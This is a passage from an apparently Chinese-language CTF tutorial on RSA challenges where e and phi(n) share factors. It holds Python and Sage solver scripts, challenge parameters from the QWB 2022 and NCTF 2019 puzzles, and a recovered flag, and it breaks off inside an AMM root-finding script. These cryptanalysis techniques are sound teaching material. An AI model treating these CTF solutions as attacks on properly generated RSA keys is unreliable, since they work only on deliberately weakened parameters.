random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>    p<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    q<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    phi_n<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    t<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>    <span class="token keyword">if</span>  gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e <span class="token operator">//</span> t<span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span> <span class="token keyword">and</span> t <span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qc<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p="</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"q="</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e="</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 当e约去公约数后与phi互素</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> e<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> p <span class="token operator">*</span> q    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e <span class="token operator">//</span> t<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    msg <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m<span class="token punctuation">,</span> t<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token keyword">if</span> msg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token operator">=</span> <span class="token number">127577058764408216374028752283743628765651360507566484643526093715329608267323381565274095814069864692746147152580906850350743742856555229701448239882612922698102985146366639955081466129923966803267071097174222576416224094182123529282235807472362341680183683025490897702891081336913842652559163341223338641607</span>q<span class="token operator">=</span> <span class="token number">156492273708587234539506501480609692085997989594717058472605523051244522493701609615085173280972894139427194976925940854142835807192417391269823151398439665817176522629246535810290194301862945052149450578938260979300632842291287807430486629994530805358742405299538986591596966945727494262182814875780600646003</span>e<span class="token operator">=</span> <span class="token number">750</span>c<span class="token operator">=</span> <span class="token number">7029383721249299532521086933490698266831518266762255492452526410777276825803657150303837084263410309063739203644435184397762022380085273363900423091223180151147964276354189658062571415744140073426572149093499560918765793389358300893454490774387180728097370701432534877005948330689495694820361726719418371072834639369078180094444137972424909816959445043108154884587947573054460257114169961823509538355580857411319157089278918107229480661280354242839678709689654304688727345294473487201644985815128413154870914132135222144633969959773621933444285994038028721862094040876152694240238708737727034258171506516394913692187</span>decrypt<span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> e<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、m-t-gt-n"><a href="#2、m-t-gt-n" class="headerlink" title="2、m**t &gt; n"></a>2、m**t &gt; n</h3><h4 id="类型一-如果m-t没有比n大多少，那就可以爆破"><a href="#类型一-如果m-t没有比n大多少，那就可以爆破" class="headerlink" title="类型一.如果m**t没有比n大多少，那就可以爆破"></a>类型一.如果m**t没有比n大多少，那就可以爆破</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> irootp <span class="token operator">=</span> q <span class="token operator">=</span> c <span class="token operator">=</span> n <span class="token operator">=</span> p<span class="token operator">*</span>qe <span class="token operator">=</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token keyword">not</span> iroot<span class="token punctuation">(</span>_m <span class="token operator">+</span> k<span class="token operator">*</span>n<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>k <span class="token operator">+=</span> <span class="token number">1</span>m <span class="token operator">=</span> iroot<span class="token punctuation">(</span>_m <span class="token operator">+</span> k<span class="token operator">*</span>n<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实就相当于转换成了一个低加密指数的题</p><h4 id="类型2-也可以选择结合中国剩余定理"><a href="#类型2-也可以选择结合中国剩余定理" class="headerlink" title="类型2.也可以选择结合中国剩余定理"></a>类型2.也可以选择结合中国剩余定理</h4><ul><li>$ x^e\equiv c\pmod{p} \ x^e\equiv c\pmod{q} $</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token triple-quoted-string string">'''p = q = c = n = e = phi = (p - 1) * (q - 1)'''</span>R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>f <span class="token operator">=</span> x <span class="token operator">^</span> e <span class="token operator">-</span> cf <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>res1 <span class="token operator">=</span> f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>f <span class="token operator">=</span> x <span class="token operator">^</span>e <span class="token operator">-</span> cf <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>res2 <span class="token operator">=</span> f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> res1<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> res2<span class="token punctuation">:</span>        ai <span class="token operator">=</span> <span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>j<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        mi <span class="token operator">=</span> <span class="token punctuation">[</span>p<span class="token punctuation">,</span>q<span class="token punctuation">]</span>        flag <span class="token operator">=</span> CRT_list<span class="token punctuation">(</span>ai<span class="token punctuation">,</span>mi<span class="token punctuation">)</span>        flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'flag'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="例题-强网杯-2022-ASR"><a href="#例题-强网杯-2022-ASR" class="headerlink" title="例题  [强网杯 2022]ASR"></a>例题  [强网杯 2022]ASR</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token keyword">from</span> secret <span class="token keyword">import</span> falgpad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>s <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> getPrime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> getPrime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> getPrime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">2</span>e <span class="token operator">=</span> <span class="token number">3</span>flag <span class="token operator">=</span> pad<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">assert</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">48</span><span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token string">'big'</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'n = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'e = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token number">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span>e <span class="token operator">=</span> <span class="token number">3</span>c <span class="token operator">=</span> <span class="token number">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">分解n得到p &#x3D; 225933944608558304529179430753170813347q &#x3D; 260594583349478633632570848336184053653r &#x3D; 218566259296037866647273372633238739089t &#x3D; 223213222467584072959434495118689164399正常情况下的RSA都要求e和phi(n)要互素，不过也有一些e和phi(n)有很小的公约数的题目，这些题目可以通过计算e对phi(n)的逆元d来求解。但是本题则为e和phi(n)的最大公约数就是e本身，也就是说e | p-1，只有对c开e次方根才行,到这里就是一个有限域开3次方根的问题了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$ m^e\equiv c\pmod{p} \ m^e\equiv c\pmod{q} \ m^e\equiv c\pmod{r} \m^e\equiv c\pmod{s}$</p><p>然后分别在GF（p）、GF(q)、GF（r）、GF(t)上对c开e&#x3D;3次方根，再用CRT组合一下即可得到在mod n下的解</p><h4 id="sage脚本"><a href="#sage脚本" class="headerlink" title="sage脚本"></a>sage脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnumn <span class="token operator">=</span> <span class="token number">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span>e <span class="token operator">=</span> <span class="token number">3</span>c <span class="token operator">=</span> <span class="token number">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span>p <span class="token operator">=</span> <span class="token number">225933944608558304529179430753170813347</span>q <span class="token operator">=</span> <span class="token number">260594583349478633632570848336184053653</span>r <span class="token operator">=</span> <span class="token number">218566259296037866647273372633238739089</span>t <span class="token operator">=</span> <span class="token number">223213222467584072959434495118689164399</span>R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>f <span class="token operator">=</span> x<span class="token operator">^</span>e<span class="token operator">-</span>cf <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>results1 <span class="token operator">=</span> f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>f <span class="token operator">=</span> x<span class="token operator">^</span>e<span class="token operator">-</span>cf <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>results2 <span class="token operator">=</span> f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>f <span class="token operator">=</span> x<span class="token operator">^</span>e<span class="token operator">-</span>cf <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>results3 <span class="token operator">=</span> f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>f <span class="token operator">=</span> x<span class="token operator">^</span>e<span class="token operator">-</span>cf <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>results4 <span class="token operator">=</span> f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> results1<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> results2<span class="token punctuation">:</span>        <span class="token keyword">for</span> l <span class="token keyword">in</span> results3<span class="token punctuation">:</span>            <span class="token keyword">for</span> k <span class="token keyword">in</span> results4<span class="token punctuation">:</span>                param1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>                param2 <span class="token operator">=</span> <span class="token punctuation">[</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>r<span class="token punctuation">,</span>t<span class="token punctuation">]</span>                m <span class="token operator">=</span> CRT_list<span class="token punctuation">(</span>param1<span class="token punctuation">,</span>param2<span class="token punctuation">)</span>                flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">b'flag'</span>  <span class="token keyword">in</span> flag<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>         <span class="token comment">#b'flag&#123;Fear_can_hold_you_prisoner_Hope_can_set_you_free&#125;\x06\x06\x06\x06\x06\x06'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="AMM有限域开方"><a href="#AMM有限域开方" class="headerlink" title="AMM有限域开方"></a><a href="https://forum.butian.net/index.php/share/1689">AMM有限域开方</a></h3><h4 id="例题-NCTF-2019-easyRSA"><a href="#例题-NCTF-2019-easyRSA" class="headerlink" title="例题  [NCTF 2019]easyRSA"></a>例题  [NCTF 2019]easyRSA</h4><p>题目</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flag <span class="token keyword">import</span> flage <span class="token operator">=</span> <span class="token number">0x1337</span>p <span class="token operator">=</span> <span class="token number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span>q <span class="token operator">=</span> <span class="token number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q<span class="token keyword">assert</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'NCTF'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span><span class="token keyword">assert</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1337</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token number">10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> random<span class="token keyword">import</span> math<span class="token keyword">def</span> <span class="token function">onemod</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>powmod<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>e<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># (r,s)=1</span>        p <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span class="token keyword">def</span> <span class="token function">AMM_rth</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> r<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># r|(q-1</span>    <span class="token keyword">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> r <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> onemod<span class="token punctuation">(</span>r<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    t <span class="token operator">=</span> <span class="token number">0</span>    s <span class="token operator">=</span> q<span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>s <span class="token operator">%</span> r <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token operator">//</span>r        t <span class="token operator">+=</span> <span class="token number">1</span>    k <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token operator">*</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> r <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        k <span class="token operator">+=</span> <span class="token number">1</span>    alp <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token operator">*</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>r    a <span class="token operator">=</span> powmod<span class="token punctuation">(</span>p<span class="token punctuation">,</span> r<span class="token operator">**</span><span class="token punctuation">(</span>t<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>s<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    b <span class="token operator">=</span> powmod<span class="token punctuation">(</span>o<span class="token punctuation">,</span> r<span class="token operator">*</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>    c <span class="token operator">=</span> powmod<span class="token punctuation">(</span>p<span class="token punctuation">,</span> s<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    h <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> t<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> powmod<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> r<span class="token operator">**</span><span class="token punctuation">(</span>t<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>        <span class="token keyword">if</span> d <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            j <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            j <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span>math<span class="token punctuation">.</span>log<span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> r        b <span class="token operator">=</span> <span class="token punctuation">(</span>b<span class="token operator">*</span><span class="token punctuation">(</span>c<span class="token operator">**</span><span class="token punctuation">(</span>r<span class="token operator">*</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> q        h <span class="token operator">=</span> <span class="token punctuation">(</span>h<span class="token operator">*</span>c<span class="token operator">**</span>j<span class="token punctuation">)</span> <span class="token operator">%</span> q        c <span class="token operator">=</span> <span class="token punctuation">(</span>c<span class="token operator">*</span>r<span class="token punctuation">)</span> <span class="token operator">%</span> q    result <span class="token operator">=</span> <span class="token punctuation">(</span>powmod<span class="token punctuation">(</span>o<span class="token punctuation">,</span> alp<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token operator">*</span>h<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">ALL_Solution</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> q<span class="token punctuation">,</span> rt<span class="token punctuation">,</span> cq<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>    mp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pr <span class="token keyword">in</span> rt<span class="token punctuation">:</span>        r <span class="token operator">=</span> <span class="token punctuation">(</span>pr<span class="token operator">*</span>m<span class="token punctuation">)</span> <span class="token operator">%</span> q        <span class="token comment"># assert(pow(r, e, q) == cq)</span>        mp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    <span class="token keyword">return</span> mp<span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span>mp<span class="token punctuation">,</span> mq<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>   